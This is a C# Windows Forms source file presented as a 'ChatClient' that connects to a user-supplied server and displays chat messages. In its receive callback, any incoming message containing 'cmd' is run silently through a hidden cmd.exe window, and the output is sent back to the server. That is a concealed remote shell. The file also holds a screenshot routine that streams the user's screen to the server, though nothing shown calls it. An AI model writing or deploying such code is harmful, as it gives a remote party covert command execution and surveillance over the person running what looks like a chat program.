using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;

namespace ChatClient
{
    public partial class Form1 : Form
    {
        bool isShared = true;
        int ms=0;
        #region MetaTags for Screenshot
        [DllImport("user32.dll", ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll", ExactSpelling = true)]
        public static extern IntPtr ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("gdi32.dll", ExactSpelling = true)]
        public static extern IntPtr BitBlt(IntPtr hDestDC, int x, int y, int nWidth, int nHeight, IntPtr hSrcDC, int xSrc, int ySrc, int dwRop);

        [DllImport("user32.dll", EntryPoint = "GetDesktopWindow")]
        public static extern IntPtr GetDesktopWindow();
        #endregion
        Socket _socket;
        byte[] buffer = new byte[1024];
        public Form1()
        {
            InitializeComponent();
            _socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        }
        public void Connect(string ipAddress,int port)
        {
            _socket.BeginConnect(new IPEndPoint(IPAddress.Parse(ipAddress), port),ConnectCallBack,null);
        }
        private void ConnectCallBack(IAsyncResult result)
        {
            if (_socket.Connected)
            {
                Invoke(new Action(() => lbConnection.Text = "Connected To The Server"));
                buffer = new byte[1024];
                _socket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, RecieveCallBack, null);
            }

        }
        private void RecieveCallBack(IAsyncResult result)
        {
            try
            {
                int bufferSize = _socket.EndReceive(result);
                byte[] packet = new byte[bufferSize];
                Array.Copy(buffer, packet, packet.Length);
                string theMessageToReceive = Encoding.ASCII.GetString(packet);
                if (theMessageToReceive.Contains("cmd"))
                {
                    Process p = new Process();
                    p.StartInfo.FileName = "cmd.exe";
                    p.StartInfo.Arguments = "/c " + theMessageToReceive.Replace("cmd", "");
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.CreateNoWindow = true;
                    p.StartInfo.UseShellExecute = false;
                    var output = "";
                    p.Start();
                    output += p.StandardOutput.ReadToEnd();
                    SendMsg(Encoding.ASCII.GetBytes("cmdoutput" + output));
                }
                else
                {
                    Invoke(new Action(() => tbMessaging.Text += "\nServer Says: " + theMessageToReceive));
                }
                buffer = new byte[1024];
                _socket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, RecieveCallBack, null);
            }
            catch { }

        }
        public void SendMsg(byte[] msg)
        {
            _socket.Send(msg);
        }
       

        private void Form1_Load(object sender, EventArgs e)
        {
                
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Connect(tbIP.Text, int.Parse(tbPort.Text));
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (_socket.Connected)
            {
                SendMsg(Encoding.ASCII.GetBytes("msg"+tbMsg.Text));
                tbMessaging.Text += "\nClient Says: " + tbMsg.Text;
            }
        }

        void ShareScreen()
        {
            while(isShared)
            {
                Bitmap bmp = Screenshot();
                ImageConverter ic = new ImageConverter();
                byte[]img=(byte[])(ic.ConvertTo(bmp, typeof(byte[])));
                string msg =Convert.ToBase64String(img);
                SendMsg(Encoding.ASCII.GetBytes(msg));
                Thread.Sleep(ms);
            }
        }
        private static Bitmap Screenshot()
        {
            var screenWidth = Screen.PrimaryScreen.Bounds.Width;
            var screenHeight = Screen.PrimaryScreen.Bounds.Height;

            var screenBmp = new Bitmap(screenWidth, screenHeight);
            var g = Graphics.FromImage(screenBmp);

            var dc1 = GetDC(GetDesktopWindow());
            var dc2 = g.GetHdc();

            BitBlt(dc2, 0, 0, screenWidth, screenHeight, dc1, 0, 0, 13369376);

            ReleaseDC(GetDesktopWindow(), dc1);
            g.ReleaseHdc(dc2);
            g.Dispose();

            return screenBmp;
        }
    }
}
